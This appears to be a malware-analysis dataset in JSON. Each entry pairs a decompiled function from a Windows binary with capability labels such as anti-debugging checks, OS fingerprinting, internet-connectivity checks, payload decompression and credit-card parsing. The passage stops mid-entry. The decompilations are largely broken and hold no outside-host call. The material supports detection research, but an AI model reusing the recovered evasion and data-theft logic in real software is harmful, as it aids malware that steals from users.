{
    "00401000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040102e) overlaps instruction at (ram,0x0040102d)\n// \n\nuint fcn.00401000(void)\n\n{\n    uint uVar1;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar2;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    // [00] -r-x section size 20480 named .text\n    bVar2 = SBORROW4(&stack0xfffffffc, 0x94);\n    lpVersionInformation = 0x94;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if ((!bVar2) && (bVar2)) {\n        *unaff_EDI = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((4 < var_90h) && (4 >= var_90h)) {\n        out(0xbd, uVar1);\n        return uVar1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 314
    },
    "00401b70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401b70(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00401100(0x80000002, 0x4071dc, 0x407228, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00402310": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023ca) overlaps instruction at (ram,0x004023c9)\n// \n// WARNING: Removing unreachable block (ram,0x004023ca)\n\nuint __cdecl fcn.00402310(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *unaff_ESI;\n    uint32_t uVar4;\n    uint *puVar5;\n    code *pcVar6;\n    char *pcVar7;\n    uint16_t in_SS;\n    bool bVar8;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar8 = arg_ch == 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    uVar4 = !bVar8;\n    if ((bVar8) || (!bVar8)) {\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x407090, arg_8h);\n        unaff_ESI = arg_8h;\n    }\n    else {\n        pcVar6 = in_SS;\n        *(uVar4 + 0x4060fc3d) = *(uVar4 + 0x4060fc3d);\n        unaff_ESI[-0x73] = unaff_ESI[-0x73] + '\\x01';\n        *0xffffffff = *0xffffffff + '\\x01';\n    }\n    (*pcVar6)(&var_264h, 0x4070a8, unaff_ESI);\n    pcVar6 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar3 = 0xffffffff;\n    pcVar7 = &var_160h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar3 - 1;\n    uVar3 = 0xffffffff;\n    pcVar7 = unaff_ESI;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070d0;\n    var_30h = 0x4070dc;\n    var_2ch = 0x4070e8;\n    var_28h = 0x4070f8;\n    var_24h = 0x407100;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = unaff_ESI;\n    var_44h = ~uVar3 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if (uVar4 < 5) {\n        uVar4 = uVar4 * 4;\n        do {\n            iVar2 = (*pcVar6)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar2 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1288
    },
    "00402af0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402af0(uint16_t *arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    uint uStack28;\n    uchar uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uint32_t var_4h;\n    \n    puVar9 = &stack0xfffffffc;\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    if ((0x5a4d < *arg_8h) && (*arg_8h < 0x5a4e)) {\n        if (!SBORROW2(*arg_8h, 0x5a4d)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar3 = in(0x5d);\n        return uVar3;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return 0;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] == 0) {\n        var_4h = 0x40;\n        if (*(arg_8h + 0x1e) < 0x81) {\n            return 0;\n        }\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            var_4h = *(arg_8h + 0x1e) - 0x80;\n        }\n        uStack24 = var_4h;\n        uStack23 = var_4h >> 8;\n        uStack22 = var_4h >> 0x10;\n        puVar4 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        pcVar2 = _sym.imp.MSVCRT.dll_rand;\n        if (puVar4 != NULL) {\n            uVar7 = 0;\n            uVar6 = var_4h;\n            if (var_4h != 0) {\n                do {\n                    uStack24 = 0x79;\n                    uStack23 = 0x2c;\n                    uStack22 = 0x40;\n                    iVar5 = (*pcVar2)();\n                    uVar8 = uVar7 + 1;\n                    uVar6 = uVar8 - var_4h;\n                    *(uVar7 + puVar4) = iVar5 % 0xff;\n                    uVar7 = uVar8;\n                } while (uVar8 < var_4h);\n            }\n            bVar11 = (POPCOUNT(uVar6 & 0xff) & 1U) != 0;\n            if ((bVar11) && (!bVar11)) {\n                puVar4 = &uStack24;\n                cVar1 = '\\x1e';\n                do {\n                    puVar9 = puVar9 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar9;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n                uVar3 = in(0x78);\n                return uVar3;\n            }\n            puVar9 = puVar4;\n            puVar10 = arg_8h + 0x40;\n            for (uVar6 = var_4h >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar10 = *puVar9;\n                puVar9 = puVar9 + 1;\n                puVar10 = puVar10 + 1;\n            }\n            for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                *puVar10 = *puVar9;\n                puVar9 = puVar9 + 1;\n                puVar10 = puVar10 + 1;\n            }\n            uStack24 = SUB41(puVar4, 0);\n            uStack23 = puVar4 >> 8;\n            uStack22 = puVar4 >> 0x10;\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1048
    },
    "00403000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040302d) overlaps instruction at (ram,0x0040302b)\n// \n// WARNING: Removing unreachable block (ram,0x004030c7)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0040310e)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403000(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint16_t unaff_BX;\n    ushort in_SS;\n    bool bVar2;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            bVar2 = (POPCOUNT((unaff_BX ^ arg_ch) & 0xff) & 1U) == 0;\n            if (((!bVar2) && (bVar2)) && (segment(in_SS, *0x10 + -0x20),  bVar2)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *(arg_18h + -1 + var_ch) = var_10h ^ *(var_8h + arg_10h) ^ *((var_ch + -1) % arg_ch + arg_8h);\n            unaff_BX = uVar1;\n            *(var_ch + arg_18h) = var_10h ^ uVar1;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 489
    },
    "00403250": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032f0) overlaps instruction at (ram,0x004032ee)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00403250(int32_t s1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x407444;\n    var_10h = 0x40743c;\n    var_ch = 0x40744c;\n    var_8h = 0x407454;\n    var_4h = 0x40745c;\n    puVar3 = &var_14h;\n    uVar4 = 0;\n    do {\n        uVar6 = (*_sym.imp.MSVCRT.dll_strstr)(s1, *puVar3);\n        if (uVar6 != 0) {\n            return true;\n        }\n        uVar5 = uVar4 + 1;\n        puVar3 = puVar3 + 1;\n        iVar1 = uVar4 - 4;\n        uVar4 = uVar5;\n    } while (uVar5 < 5);\n    if (4 < uVar5) {\n        if (SBORROW4(uVar5, 5) != iVar1 < 0) {\n            *(s1 + -1) = *(s1 + -1);\n            pcVar2 = sym.imp.MSVCRT.dll_strstr + (uVar6 >> 0x20);\n            goto code_r0x004032fc;\n        }\n    }\n    pcVar2 = (*_sym.imp.MSVCRT.dll_strstr)(s1, 0x407434);\ncode_r0x004032fc:\n    return pcVar2 == NULL;\n}\n",
        "token_count": 466
    },
    "00401230": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401230(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00403bc0();\n        fcn.00402030();\n        fcn.00403980();\n        if (*0x4214f8 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004024c0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 146
    },
    "00403bc0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403cf1) overlaps instruction at (ram,0x00403cf0)\n// \n\nvoid fcn.00403bc0(void)\n\n{\n    uint8_t uVar1;\n    uint8_t extraout_AH;\n    int32_t iVar2;\n    uint *puVar3;\n    char extraout_CL;\n    char extraout_CH;\n    char extraout_CH_00;\n    ushort extraout_CX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    int32_t *piVar4;\n    int32_t extraout_EDX;\n    char extraout_DH;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    char *unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar5;\n    uint8_t *unaff_EDI;\n    uint16_t in_SS;\n    uchar uVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    bool bVar8;\n    uchar uVar9;\n    char cVar10;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar11;\n    char cVar12;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar13;\n    unkbyte10 extraout_ST0;\n    ulong uVar14;\n    uint uVar15;\n    uint *puVar16;\n    uint arg_14h;\n    \n    uVar14 = fcn.00401800(0x407494, 0xf, 0x407028, 10);\n    piVar4 = uVar14 >> 0x20;\n    *(uVar14 + -0x7ce92414) = extraout_ST0;\n    in_AF = 9 < (uVar14 - 1U & 0xf) | in_AF;\n    *piVar4 = *piVar4 + 0x126adf84;\n    fcn.00401800(0x407494, 0xf, 0x407034, unaff_EBX);\n    uVar1 = fcn.00401800(0x407494, 0xf, 0x407048, 4);\n    cVar10 = uVar1 - *unaff_EDI;\n    uVar13 = (in_NT & 1) * 0x4000 | SBORROW1(uVar1, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar10 < '\\0') * 0x80 | (cVar10 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar10) & 1U) == 0) * 4\n             | uVar1 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    puVar5 = unaff_ESI + -1;\n    puVar3 = &stack0xffffffdc;\n    func_0x10189bbc();\n    puVar16 = extraout_EDX + 0xc;\n    fcn.00401800(0x407494, 0xf, 0x40704c, uVar13);\n    bVar7 = extraout_DH == extraout_CL;\n    fcn.00401800(0x407494, 0xf, 0x407058, 7);\n    if ((!bVar7) && (bVar7)) {\n        cVar10 = '\\x10';\n        do {\n            puVar16 = puVar16 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *puVar16;\n            cVar10 = cVar10 + -1;\n        } while ('\\0' < cVar10);\n    }\n    fcn.00401800(0x407494, 0xf, 0x407060, 0xb);\n    fcn.00401800(0x407494, 0xf, 0x40706c, 0xc);\n    while( true ) {\n        fcn.00401800(0x407494, 0xf, 0x407078, 8);\n        fcn.00401800(0x407494, 0xf, 0x407080, 0xd);\n        uVar1 = extraout_DL + 0x15;\n        bVar7 = uVar1 < extraout_AH;\n        bVar11 = SBORROW1(uVar1, extraout_AH);\n        bVar8 = uVar1 == extraout_AH;\n        iVar2 = fcn.00401800(0x407494, 0xf, 0x407090, 0x18);\n        if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) break;\n        if (!bVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(iVar2 + 0x40) = *(iVar2 + 0x40);\n    }\n    fcn.00401800(0x407494, 0xf, 0x4070a8, 0x25);\n    fcn.00401800(0x407494, 0xf, 0x4070d0, 10);\n    arg_14h = 0x4070dc;\n    uVar13 = 0xf;\n    uVar15 = 0x407494;\n    fcn.00401800(0x407494, 0xf, 0x4070dc, 0xc);\n    cVar10 = *unaff_EBX;\n    *(unaff_EDI + 0x6b) = *(unaff_EDI + 0x6b) - &stack0xffffa17d;\n    *(extraout_EDX_00 + 0xf) = *(extraout_EDX_00 + 0xf) + (extraout_CH - cVar10);\n    fcn.00401800(0x407494, uVar15, uVar13, arg_14h);\n    fcn.00401800(0x407494, 0xf, 0x4070f8, 6);\n    puVar16 = uVar13 & 0xffff0000 | in_SS;\n    fcn.00401800(0x407494, 0xf, 0x407100, 0x47);\n    bVar7 = in_SS == 1;\n    fcn.00401800(0x407494, 0xf, 0x407108, 0xd);\n    if ((!bVar7) && (bVar7)) {\n        out(*puVar5, extraout_DX);\n        puVar5 = unaff_ESI;\n    }\n    puVar3 = fcn.00401800(0x407494, 0xf, 0x407118, 0x19);\n    uVar6 = puVar16 < puVar3;\n    cVar12 = SBORROW4(puVar16, puVar3);\n    cVar10 = puVar16 - puVar3 < 0;\n    uVar9 = puVar16 == puVar3;\n    fcn.00401800(0x407494, 0xf, 0x407134, 0xf);\n    uVar15 = 0x403ea1;\n    fcn.00401800(0x407494, 0xf, 0x407144, 0xe);\n    if ((uVar9 || cVar12 != cVar10) || (!uVar9 && cVar12 == cVar10)) {\n        uVar15 = 0xb;\n    }\n    fcn.00401800(0x407494, 0xf, 0x407154, uVar15);\n    if ((!uVar6 && !uVar9) && (uVar6 || uVar9)) {\n        *puVar16 = *puVar5;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(extraout_EDX_01 + 0xf) = *(extraout_EDX_01 + 0xf) + extraout_CH_00;\n    fcn.00401800(0x407494, 0xf, 0x407160, 0xb);\n    fcn.00401800(0x407494, 0xf, 0x40716c, 0xb);\n    fcn.00401800(0x407494, 0xf, 0x407178, 10);\n    bVar7 = false;\n    bVar8 = (CONCAT11(extraout_CX >> 8 & (unaff_EBX & 0xffff) >> 8, extraout_CX | unaff_EBX & 0xffff) & in_SS) == 0;\n    fcn.00401800(0x407494, 0xf, 0x407184, 0xc);\n    if ((!bVar7 && !bVar8) && (bVar7 || bVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar15 = fcn.00401800(0x407494, 0xf, 0x407190, 0xe);\n    if ((!bVar7) && (bVar7)) {\n        out(0xbd, uVar15);\n        return;\n    }\n    fcn.00401800(0x407494, 0xf, 0x4071a0, 0x11);\n    fcn.00401800(0x407494, 0xf, 0x4071b4, 0x13);\n    fcn.00401800(0x407494, 0xf, 0x4071c8, 0x14);\n    fcn.00401800(0x407494, 0xf, 0x4071dc, 0x33);\n    cVar12 = SBORROW4(extraout_ECX, 0x5354);\n    cVar10 = extraout_ECX + -0x5354 < 0;\n    bVar7 = extraout_ECX == 0x5354;\n    fcn.00401800(0x407494, 0xf, 0x407210, 10);\n    if ((!bVar7) && (bVar7)) {\n        out(*puVar5, extraout_DX_00);\n    }\n    uVar15 = 0x40409f;\n    fcn.00401800(0x407494, 0xf, 0x40721c, 4);\n    if ((bVar7 || cVar12 != cVar10) || (!bVar7 && cVar12 == cVar10)) {\n        uVar15 = 5;\n    }\n    fcn.00401800(0x407494, 0xf, 0x407220, uVar15);\n    fcn.00401800(0x407494, 0xf, 0x407228, 6);\n    fcn.00401800(0x407494, 0xf, 0x40725c, 0x2a);\n    fcn.00401800(0x407494, 0xf, 0x407288, 0xb);\n    return;\n}\n",
        "token_count": 2614
    },
    "00401510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401520) overlaps instruction at (ram,0x0040151c)\n// \n// WARNING: Removing unreachable block (ram,0x0040153c)\n// WARNING: Removing unreachable block (ram,0x00401545)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401510(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    char extraout_DH;\n    char *unaff_EBX;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0x40;\n    iVar2 = 0;\n    piVar5 = &var_10bh;\n    while( true ) {\n        lpBuffer = 0;\n        bVar7 = false;\n        piVar6 = piVar5;\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *piVar6 = iVar2;\n            piVar6 = piVar6 + 1;\n        }\n        *piVar6 = iVar2;\n        var_8h = 0;\n        piVar5 = piVar6 + 3;\n        *(piVar6 + 2) = iVar2;\n        puVar3 = fcn.00401080();\n        if ((bVar7) || (!bVar7)) break;\n        iVar2 = puVar3 + 1;\n        if (&stack0xfffffcdc < *puVar3 || iVar2 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *unaff_EBX = *unaff_EBX + extraout_DH;\n        iVar4 = extraout_ECX;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00404790();\n        arg_ch_01 = fcn.00404790();\n        arg_ch_02 = fcn.00404790();\n        fcn.00401a80(arg_10h, arg_ch_00);\n        fcn.00401a80(arg_8h, arg_ch_01);\n        fcn.00401a80(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407028, &lpBuffer, arg_10h);\n        iVar4 = fcn.00404ce0(&var_314h);\n        if (iVar4 != 0) {\n            (*pcVar1)(&var_210h, 0x407034, &lpBuffer, arg_8h);\n            iVar4 = fcn.00404ce0(&var_210h);\n            if (iVar4 != 0) {\n                (*pcVar1)(&var_210h, 0x407034, &lpBuffer, arg_ch);\n                iVar4 = fcn.00404ce0(&var_210h);\n                if (iVar4 != 0) {\n                    iVar4 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar4 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401a80(arg_14h, 4);\n    return iVar4 != 0;\n}\n",
        "token_count": 895
    },
    "00403980": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b7c) overlaps instruction at (ram,0x00403b79)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403980(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.004044d0();\n    iVar3 = fcn.00403170();\n    if (iVar3 != 0) {\n        puVar4 = &var_25fh;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar3 != 0) {\n            if ((-1 < iVar3) && (-1 >= iVar3)) {\n                *(puVar4 + 3U | &stack0xfffffffc) = iVar3;\n            }\n            fcn.00401080();\n            s = 0;\n            puVar4 = &var_15bh;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar4 = &var_58h;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                lParam = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                if (iVar3 == 0) {\n                    return;\n                }\n                (*pcVar2)();\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                if (iVar3 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                (*pcVar1)();\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 753
    },
    "004016c0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401740) overlaps instruction at (ram,0x0040173f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004016c0(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uchar *unaff_EBP;\n    uchar *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    char cVar11;\n    uchar uVar12;\n    bool bVar13;\n    unkbyte6 Var14;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar4 = fcn.004026d0(0, arg_8h, arg_ch + 1U >> 1);\n    puVar8 = uVar4;\n    cVar11 = '\\0';\n    bVar13 = false;\n    uVar12 = uVar4 == -0x36;\n    Var14 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar4 = Var14 >> 0x20;\n    if ((bVar13) || (!bVar13)) {\n        puVar10 = *(Var14 + 0x58);\n        if (!bVar13) goto code_r0x00401722;\ncode_r0x00401740:\n        if (puVar8 < puVar10) {\n            puVar8 = (puVar8 - puVar10 & 0xffffU) - 1;\n        }\n        else {\n            puVar8 = puVar8 - (puVar10 & 0xffff);\n        }\n        uVar6 = puVar10 >> 0x10;\n        unaff_EBP = &stack0xfffffffc;\n        if (puVar10 >> 0x10 <= puVar8) {\n            iVar9 = puVar8 - uVar6;\n            goto code_r0x004017ba;\n        }\n    }\n    else {\n        puVar5 = Var14 + 1;\n        puVar10 = arg_8h + 1;\n        puVar1 = puVar8 + 1;\n        *arg_8h = *puVar8;\n        uVar4 = 0x788b;\n        *puVar1 = *puVar1 - cVar11;\n        uVar3 = puVar5;\n        cVar11 = CARRY1(*puVar5, uVar3);\n        bVar13 = SCARRY1(*puVar5, uVar3);\n        *puVar5 = *puVar5 + uVar3;\n        uVar12 = *puVar5 == 0;\n        puVar8 = puVar1;\ncode_r0x00401722:\n        uVar6 = uVar4;\n        if (!bVar13) goto code_r0x00401740;\n        uVar2 = in(uVar4);\n        *puVar10 = uVar2;\n        if (cVar11 || uVar12) {\n            return 0x72f73bef;\n        }\n    }\n    iVar9 = (puVar8 - uVar6 & 0xffff) - 1;\n    puVar7 = unaff_EBP;\ncode_r0x004017ba:\n    **(puVar7 + 0x14) = iVar9 + *(puVar7 + 0xc);\n    iVar9 = *(puVar7 + 8);\n    **(puVar7 + 0x10) = *(iVar9 + 0x58);\n    return iVar9;\n}\n",
        "token_count": 821
    },
    "00401d70": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
